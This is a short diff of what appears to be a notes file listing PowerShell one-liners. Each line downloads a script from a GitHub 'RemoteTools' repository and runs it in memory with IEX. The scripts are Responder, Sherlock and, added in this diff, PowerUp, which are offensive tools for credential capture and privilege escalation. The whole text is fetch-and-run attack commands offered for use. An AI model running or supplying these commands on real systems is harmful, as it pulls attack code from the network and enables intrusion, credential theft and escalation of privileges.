@@ -9,3 +9,5 @@ IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/Responder.ps1')  
 
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/Sherlock.ps1')
+
+IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/PowerUp.ps1')
